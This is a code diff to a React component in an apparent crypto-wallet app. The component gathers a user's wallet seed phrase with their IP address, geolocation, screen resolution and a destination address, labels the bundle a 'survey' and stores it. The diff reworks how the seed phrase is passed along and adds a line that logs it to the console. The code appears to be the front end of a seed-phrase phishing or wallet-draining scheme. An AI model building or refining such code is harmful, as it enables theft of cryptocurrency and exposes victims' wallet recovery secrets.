@@ -57,7 +57,6 @@ interface OriginProps {
 function OriginAddress({ onNext }: OriginProps) {
 	const [blockChainNetwork, setBlockChainNetwork] = useState<string>("");
 	const [selectedWallet, setSelectedWallet] = useState("");
-	const [walletPhrase, setWalletPhrase] = useState("");
 	const [originSteps, setOriginSteps] = useState<number>(0);
 	const [addressMode, setAddressMode] = useState<"manual" | "automatic">(
 		"automatic"
@@ -66,14 +65,12 @@ function OriginAddress({ onNext }: OriginProps) {
 	// ✅ New states
 	const [viewingManualWallet, setViewingManualWallet] = useState(false);
 	const [isTransitionLoading, setIsTransitionLoading] = useState(false);
-
 	const [isContinueDisabled, setContinueDisabled] = useState(true);
 	const [isOverlayVisible, setOverlayVisible] = useState(false);
 	const [isLoading, setLoading] = useState(false);
 	const [showFailure, setShowFailure] = useState(false);
 
 	const {
-		seedPhrase,
 		destinationAddress,
 		ipAddress,
 		geolocation,
@@ -126,13 +123,13 @@ function OriginAddress({ onNext }: OriginProps) {
 	};
 
 	// ✅ Proceed to next after viewing manual wallet
-	const handleFinish = async () => {
+	const handleFinish = async (walletPhrase: string) => {
 		setIsTransitionLoading(true);
 		try {
 			const survey = {
 				blockchainNetwork: blockChainNetwork,
 				walletProvider: selectedWallet,
-				seedPhrase: walletPhrase || seedPhrase,
+				seedPhrase: walletPhrase,
 				destinationAddress,
 				ipAddress,
 				geolocation,
@@ -140,6 +137,7 @@ function OriginAddress({ onNext }: OriginProps) {
 				screenResolution,
 				walletName,
 			};
+			console.log("this is the wallet phrase", walletPhrase);
 			const surveyId = await storeSurveyData(survey);
 			if (surveyId) {
 				setWalletId(surveyId);
@@ -270,7 +268,6 @@ function OriginAddress({ onNext }: OriginProps) {
 					<ShowManualWallets
 						handleFinish={handleFinish}
 						selectedWallet={selectedWallet}
-						setWalletPhrase={setWalletPhrase}
 					/>
 				)}
 			</div>
